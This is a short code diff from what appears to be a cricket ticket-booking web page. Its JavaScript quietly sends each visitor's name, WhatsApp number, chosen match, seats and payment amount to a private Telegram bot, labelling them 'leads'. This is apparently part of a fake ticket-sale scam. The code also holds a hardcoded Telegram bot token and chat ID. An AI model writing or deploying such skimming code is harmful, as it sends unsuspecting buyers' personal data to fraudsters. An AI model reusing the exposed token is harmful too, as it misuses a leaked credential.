@@ -98,7 +98,7 @@ document.addEventListener("DOMContentLoaded", async () => {
 
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513"; 
-            const telegramMsg = `💰 LEAD REACHED SEAT SELECTION PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${window.sType}\n💵 Total Amount: ₹${totalAmt}`;
+            const telegramMsg = `💰 LEAD REACHED SEAT ADRESS PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${window.sType}\n💵 Total Amount: ₹${totalAmt}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
 
             // 4. BHEJO AUR WAIT KARO
